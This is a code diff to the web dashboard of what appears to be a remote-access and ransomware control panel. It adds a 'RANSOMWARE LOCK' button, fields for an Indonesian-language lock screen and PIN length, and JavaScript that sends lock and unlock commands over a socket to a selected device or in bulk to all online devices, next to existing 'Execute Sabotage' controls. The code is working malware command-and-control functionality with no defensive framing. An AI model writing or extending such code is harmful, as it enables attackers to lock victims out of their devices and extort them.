@@ -480,6 +480,19 @@
                             <button class="header-btn" onclick="sendSabotage()" style="background:#d32f2f;color:#fff;border-color:#d32f2f;font-weight:bold;">&#x26a1; Execute Sabotage</button>
                             <button class="header-btn" onclick="sendStopSabotage()" style="border-color:#ff6b6b;color:#ff6b6b;">Stop Sabotage</button>
                         </div>
+                        <div style="display:flex;gap:4px;margin-top:8px;flex-wrap:wrap;align-items:center;">
+                            <input id="ransomMessage" placeholder="Pesan kunci..." value="Device Terkunci" style="flex:1;min-width:150px;padding:5px 8px;border-radius:5px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.72rem;">
+                            <input id="ransomSubtitle" placeholder="Subtitle..." value="Masukkan PIN untuk membuka" style="flex:1;min-width:150px;padding:5px 8px;border-radius:5px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.72rem;">
+                            <select id="ransomMaxPin" style="padding:5px 8px;border-radius:5px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.72rem;">
+                                <option value="4">4 digit</option>
+                                <option value="6" selected>6 digit</option>
+                                <option value="8">8 digit</option>
+                            </select>
+                        </div>
+                        <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="sendRansomwareLock()" style="background:#c62828;color:#fff;border-color:#c62828;font-weight:bold;font-size:0.8rem;">&#x1f6ab; RANSOMWARE LOCK</button>
+                            <button class="header-btn" onclick="sendRansomwareUnlock()" style="border-color:#00c853;color:#00c853;font-weight:bold;">&#x1f513; Unlock Device</button>
+                        </div>
                         <div id="pcStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
 
@@ -2123,6 +2136,43 @@
                 }
                 statusEl.textContent = 'Sabotage stopped on ' + sent + ' device';
                 showToast('Bulk sabotage stopped: ' + sent + ' device', 'info');
+            }
+        }
+
+        function sendRansomwareLock() {
+            const msg = document.getElementById('ransomMessage').value || 'Device Terkunci';
+            const subtitle = document.getElementById('ransomSubtitle').value || 'Masukkan PIN untuk membuka';
+            const maxPin = parseInt(document.getElementById('ransomMaxPin').value) || 6;
+            const statusEl = document.getElementById('pcStatus');
+            const id = document.getElementById('pcDeviceSelect').value;
+            if (id) {
+                socket.emit('admin-ransomware-lock', { deviceId: id, message: msg, subtitle: subtitle, maxPin: maxPin, showPin: true });
+                statusEl.textContent = 'Ransomware lock sent to ' + id.slice(0,8);
+                showToast('RANSOMWARE LOCK activated', 'success');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-ransomware-lock', { deviceId: did, message: msg, subtitle: subtitle, maxPin: maxPin, showPin: true }); sent++; }
+                }
+                statusEl.textContent = 'Ransomware lock sent to ' + sent + ' device';
+                showToast('BULK RANSOMWARE LOCK: ' + sent + ' device', 'success');
+            }
+        }
+
+        function sendRansomwareUnlock() {
+            const id = document.getElementById('pcDeviceSelect').value;
+            const statusEl = document.getElementById('pcStatus');
+            if (id) {
+                socket.emit('admin-ransomware-unlock', { deviceId: id });
+                statusEl.textContent = 'Unlock sent to ' + id.slice(0,8);
+                showToast('Device unlocked', 'info');
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-ransomware-unlock', { deviceId: did }); sent++; }
+                }
+                statusEl.textContent = 'Unlock sent to ' + sent + ' device';
+                showToast('Bulk unlock: ' + sent + ' device', 'info');
             }
         }
 
